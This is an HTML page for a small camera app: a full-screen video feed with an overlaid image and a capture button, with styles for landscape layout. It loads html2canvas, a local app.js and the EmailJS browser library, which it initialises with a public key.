<!DOCTYPE html>
<html>

<head>
    <title>Camera App</title>
    <style>
        body {
            margin: 0;
            background-color: black;
        }

        #container {
            position: relative;
            overflow: hidden;
        }

        #videoElement {
            width: 100vw;
            height: 100vh;
            object-fit: cover;
        }

        #image {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 40vw;
        }

        #downloadButton {
            position: absolute;
            top: 80%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 150px;
            height: 150px;
            border: 4px solid gray;
            border-radius: 50%;
            background-color: white;
        }

        .landscapeImg {
            width: 25vw !important;
        }

        .landscapeBtn {
            left: 90% !important;
            top: 50% !important;
            width: 80px !important;
            height: 80px !important;
        }
    </style>
</head>

<body>
    <div id="container">
        <video autoplay="true" id="videoElement" playsinline>
        </video>
        <img id="image" src="IMG_6393.PNG" />
        <button id="downloadButton"></button>
    </div>
    <script src="app.js"></script>
    <script src="html2canvas.min.js"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
    </script>
    <script type="text/javascript">
        (function () {
            emailjs.init("SXpe5bXZFtpUlLK6W");
        })();
    </script>
</body>

</html>
